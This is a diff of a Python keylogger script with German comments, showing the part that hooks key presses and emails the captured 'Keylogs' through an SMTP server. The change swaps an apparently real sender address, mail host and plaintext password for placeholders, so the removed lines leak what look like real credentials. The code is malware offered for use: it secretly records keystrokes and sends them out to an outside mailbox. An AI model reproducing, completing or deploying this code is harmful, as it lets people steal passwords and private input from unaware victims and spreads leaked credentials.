@@ -17,8 +17,8 @@ def on_key(event):
 keyboard.on_press(on_key)
 
 def send_email():
-    from_addr = 'rickroll1@gmx.de'  # deine E-Mail-Adresse
-    to_addr = 'emil.sonnenschein@t-online.de'    # die Ziel-E-Mail-Adresse
+    from_addr = 'your@email.de'  # deine E-Mail-Adresse
+    to_addr = 'target@email.de'    # die Ziel-E-Mail-Adresse
     subject = 'Keylogs'   # Betreff der E-Mail
     body = ''                              # Inhalt der E-Mail
 
@@ -28,9 +28,9 @@ def send_email():
 
     # SMTP-Verbindung herstellen und E-Mail senden
     try:
-        server = smtplib.SMTP('mail.gmx.net', 587)
+        server = smtplib.SMTP('example.smtp.server', 587) #put your email providers smtp server here
         server.starttls()
-        server.login(from_addr, 'IchHabeDeineDaten@2024Nr2')  # Dein E-Mail-Passwort
+        server.login(from_addr, 'YourSecretPassword')  # Dein E-Mail-Passwort
         msg = f"From: {from_addr}\nTo: {to_addr}\nSubject: {subject}\n\n{body}"
         server.sendmail(from_addr, to_addr, msg)
         server.quit()
